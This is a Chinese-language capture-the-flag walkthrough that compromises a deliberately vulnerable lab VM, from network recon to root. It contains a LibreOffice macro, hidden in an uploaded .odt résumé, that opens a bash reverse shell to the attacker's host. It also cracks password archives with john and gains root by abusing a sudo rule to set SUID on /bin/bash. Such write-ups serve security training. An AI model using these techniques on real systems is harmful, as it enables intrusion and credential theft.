# 一、信息收集

## 1. 主机发现

首先，在当前网段内进行主机发现，确定目标靶机的IP地址。使用`arp-scan`工具扫描本地网络。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.131 08:00:27:71:8b:9b       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e9:a7:63       VMware, Inc.
...
```

扫描结果显示，目标主机IP为 `192.168.205.131`。

## 2. 端口扫描

确认目标IP后，使用`nmap`对目标进行全端口扫描，以探测其开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.131                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 21:52 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00021s latency).
Not shown: 65527 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s
MAC Address: 08:00:27:71:8B:9B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.29 seconds
```

扫描发现目标开放了多个端口，包括`22 (SSH)`、`80 (HTTP)`、`445 (SMB)`以及多个邮件服务端口。我们首先从最容易获取信息的HTTP服务入手。

## 3. Web信息探测

访问`http://192.168.205.131`，发现是一个招聘网站。在浏览网站内容时，注意到其链接指向了一个域名 `gyhabogados.thl`。为了方便后续的探测，将其添加到本地`/etc/hosts`文件。

```bash
# 将以下行添加到 /etc/hosts 文件
192.168.205.131 gyhabogados.thl
```

**子域名爆破**

由于发现了邮件服务端口，推测可能存在如`mail`之类的子域名。使用`wfuzz`结合`HOST`头对子域名进行爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wfuzz -c -u "http://gyhabogados.thl" -H "HOST:FUZZ.gyhabogados.thl" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 671
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                          
=====================================================================
000000002:   200        96 L     343 W      5580 Ch     "mail - mail" 
...
```

成功发现子域名 `mail.gyhabogados.thl`，同样将其添加到`/etc/hosts`文件。

**目录扫描**

接着使用`gobuster`对主站进行目录扫描，寻找可利用的路径或文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://gyhabogados.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
...
/uploads              (Status: 301) [Size: 320] [--> http://gyhabogados.thl/uploads/]
/images               (Status: 301) [Size: 319] [--> http://gyhabogados.thl/images/]
/index.php            (Status: 200) [Size: 7760]
/config               (Status: 301) [Size: 319] [--> http://gyhabogados.thl/config/]
/roundcube            (Status: 301) [Size: 322] [--> http://gyhabogados.thl/roundcube/]
...
```

扫描结果中，我们发现了一些关键目录，如 `/uploads`、`/config`，以及一个Webmail系统 `/roundcube`。

# 二、漏洞利用与初步访问

重新访问网站，在`http://gyhabogados.thl/work-with-us.php`页面发现了一个文件上传功能，允许求职者上传简历。测试发现该功能似乎会对文档文件进行处理，这可能是一个攻击入口。

我们尝试构造一个包含反向Shell宏的`.odt`（OpenDocument Text）文件。当服务器端应用（如LibreOffice）打开此文件以解析其内容时，可能会自动执行宏，从而触发我们的Payload。

**宏制作**

1. 在LibreOffice Writer中，通过 `工具 -> 宏 -> 管理宏 -> Basic` 创建一个新的宏。

2. 写入用于创建反向Shell的Basic脚本代码。以下为示例：

   ```basic
   Sub Main
       Dim command as String
       command = "bash -c 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'"
       Shell(command)
   End Sub
   ```

3. 将此宏绑定到文档的“打开文档”事件上，并保存为`.odt`格式。

**获取Shell**

在Kali上设置`netcat`监听8888端口，然后通过网站上传构造好的`.odt`文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888                 
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 55862
bash: cannot set terminal process group (2362): Inappropriate ioctl for device
bash: no job control in this shell
bash: /home/bob/.bashrc: Permission denied
bob@TheHackersLabs-Gyhabogados:~$ id
uid=1000(bob) gid=1000(bob) groups=1000(bob),27(sudo),100(users)
```

成功接收到反弹Shell，当前用户为`bob`。

# 三、权限提升

## 1. Shell稳定化

为了更好的交互体验，使用以下命令序列将简易Shell升级为功能完整的TTY。

```bash
script /dev/null -c bash
# 按下 Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

## 2. bob -> sam

在之前目录扫描发现的 `/config` 目录中，查找敏感信息。

```bash
bob@TheHackersLabs-Gyhabogados:/var/www/html/config$ cat db.php 
<?php

$mysqli = mysqli_connect('127.0.0.1', 'bob', 'sup3rS3cretP4ssword_2024!', 'candidatos');

if (mysqli_error($mysqli)) {
  die('Ocurrio un error al conectarse a la base de datos ' . mysqli_error($mysqli));
}
```

发现了数据库凭据 `bob:sup3rS3cretP4ssword_2024!`。尝试使用该密码切换用户或执行sudo，但均失败。

回到`bob`用户的主目录，发现一个加密的7z压缩文件 `credentials.7z`。

```bash
bob@TheHackersLabs-Gyhabogados:~$ ls
credentials.7z
```

使用`scp`将其传输回Kali进行破解。

```bash
bob@TheHackersLabs-Gyhabogados:~$ scp credentials.7z kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
```

在Kali上，使用`7z2john`提取哈希，然后用`john`和`rockyou.txt`字典进行破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z2john credentials.7z > hash
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
barcelona        (credentials.7z)     
...
```

密码成功破解为 `barcelona`。解压文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x credentials.7z
...
Enter password (will not be echoed):
...
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat credentials.txt
bob:a7gyqqp6bt2!uv@2u
```

得到一对新凭据 `bob:a7gyqqp6bt2!uv@2u`。结合之前发现的webmail系统（`http://mail.gyhabogados.thl/roundcube/`），使用此凭据登录`bob`的邮箱。

在邮箱中，发现了一封包含`sam`用户凭据的邮件。

> **邮件内容摘要:**
> Usuario: sam
> Contraseña: Welcome2024!

使用`su`命令和新获取的密码切换到`sam`用户。

```bash
bob@TheHackersLabs-Gyhabogados:~$ su sam
Password: Welcome2024!
sam@TheHackersLabs-Gyhabogados:/home/bob$ id
uid=1002(sam) gid=1006(abogados) groups=1006(abogados),100(users)
```

## 3. sam -> dean

成为`sam`用户后，查看`/etc/samba/smb.conf`文件，发现在多个Samba共享中，`sam`可以访问 `[CONFIDENCIALES]` 和 `[RESPALDOS_IT]`。

```bash
sam@TheHackersLabs-Gyhabogados:/tmp$ cat /etc/samba/smb.conf
...
[RESPALDOS_IT]
  comment = Respaldos IT
  path = /mnt/RESPALDOS_IT
  ...
  valid users = sam, dean
```

检查 `/mnt/RESPALDOS_IT` 目录内容。

```bash
sam@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ ls -al
total 16
drwxr-x--- 2 root abogados 4096 Dec  8  2024 .
drwxr-xr-x 5 root root     4096 Dec  8  2024 ..
-rw-r--r-- 1 root abogados  520 Dec  8  2024 credenciales.psafe3
-rw-r--r-- 1 root abogados  582 Dec  7  2024 IMPORTANTE.txt

sam@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ cat IMPORTANTE.txt
...
La contraseña maestra es similar a la que te proporcioné en la bienvenida: "ChevyImpala1967". Sin embargo, en lugar de "1967", deberás usar un año diferente.
```

发现一个`PasswordSafe`的密码库文件 `credenciales.psafe3` 和一个提示文件。提示表明主密码格式为 `ChevyImpala` 加上一个年份。

将`credenciales.psafe3`传输到Kali，并生成一个年份字典进行破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ seq -f "ChevyImpala%g" 1967 2025 > p
└─$ pwsafe2john credenciales.psafe3 > hash
└─$ john --wordlist=p hash
...
ChevyImpala1995  (credencial)
...
```

密码库主密码为 `ChevyImpala1995`。使用`pwsafe`等工具打开密码库，发现其中存储了`dean`用户的凭据。

> **密码库内容:**
> dean:MasterOfPuppets1986

切换到`dean`用户。

```bash
sam@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ su dean
Password: MasterOfPuppets1986
dean@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ id
uid=1001(dean) gid=1006(abogados) groups=1006(abogados),100(users)
```

## 4. dean -> john

`dean`用户同样可以访问Samba共享。检查 `[IT_TOOLS]` 共享。

```bash
dean@TheHackersLabs-Gyhabogados:~$ cd /mnt/IT_TOOLS/
dean@TheHackersLabs-Gyhabogados:/mnt/IT_TOOLS$ ls -al
total 12
drwxr-x--- 2 root it   4096 Dec  8  2024 .
drwxr-xr-x 5 root root 4096 Dec  8  2024 ..
-rw-r--r-- 1 root root 1458 Dec  7  2024 private_key.ppk
```

发现了一个`PuTTY`格式的私钥文件 `private_key.ppk`。查看其内容可知该密钥未加密。

```bash
dean@TheHackersLabs-Gyhabogados:/mnt/IT_TOOLS$ strings private_key.ppk
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
...
```

将私钥传输回Kali，并使用`puttygen`转换为OpenSSH格式。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ puttygen private_key.ppk -O private-openssh -o /tmp/id_rsa
└─$ chmod 600 /tmp/id_rsa
```

根据`/home`目录下的用户列表，推测该密钥属于`john`用户。尝试使用该密钥SSH登录。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh john@192.168.205.131 -i /tmp/id_rsa
...
john@TheHackersLabs-Gyhabogados:~$ id
uid=1003(john) gid=1003(john) groups=1003(john),100(users),1005(it)
```

成功以`john`用户身份登录。

## 5. john -> root

登录后，检查`john`的`sudo`权限，提示需要密码。

```bash
john@TheHackersLabs-Gyhabogados:~$ sudo -l
[sudo] password for john: 
sudo: a password is required
```

在之前`dean`用户的邮箱中，曾发现一张名为`impala_67.jpg`的图片。这通常暗示了隐写术。通过使用隐写工具（如`stegseek`）分析该图片，可以提取出`john`用户的密码。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ stegseek impala_67.jpg                              
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "ironmaiden"
[i] Original filename: "credentials.txt".
[i] Extracting to "impala_67.jpg.out".
...
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat impala_67.jpg.out
john: TI!Powerful2024
```

获取到密码 `john:TI!Powerful2024`。再次检查`sudo`权限。

```bash
john@TheHackersLabs-Gyhabogados:~$ sudo -l
[sudo] password for john: TI!Powerful2024
...
User john may run the following commands on TheHackersLabs-Gyhabogados:
    (ALL) PASSWD: /usr/bin/python3 /home/john/tools/backup.py
```

`john`用户可以以root权限执行一个位于`/home/john/tools/backup.py`的Python脚本。但检查发现该文件和目录并不存在。

```bash
john@TheHackersLabs-Gyhabogados:~$ ls -al /home/john/tools/backup.py
ls: cannot access '/home/john/tools/backup.py': No such file or directory
```

这是一个典型的sudo权限配置错误。我们可以自行创建该脚本，并写入提权代码。这里选择为`/bin/bash`添加SUID权限位。

```bash
john@TheHackersLabs-Gyhabogados:~$ echo 'import os; os.system("chmod +s /bin/bash")' > /home/john/tools/backup.py
```

执行`sudo`命令触发Payload。

```bash
john@TheHackersLabs-Gyhabogados:~$ sudo /usr/bin/python3 /home/john/tools/backup.py
john@TheHackersLabs-Gyhabogados:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

可以看到`/bin/bash`已成功设置SUID位。现在执行`bash -p`即可获得一个euid为0的root权限Shell。

```bash
john@TheHackersLabs-Gyhabogados:~$ bash -p
bash-5.2# id
uid=1003(john) gid=1003(john) euid=0(root) egid=0(root) groups=0(root),100(users),1003(john),1005(it)
```

# 四、获取凭证

成功提权至root后，读取最终的flag文件。

```bash
bash-5.2# cat /home/dean/user.txt
930b5a4b9098abfdaa67f93a937593bf

bash-5.2# cat /root/notes.txt | grep Flag
Flag: 63baa2b1cd7ac490cf34e7c6a317067b
```

成功获取user和root两个flag，渗透测试完成。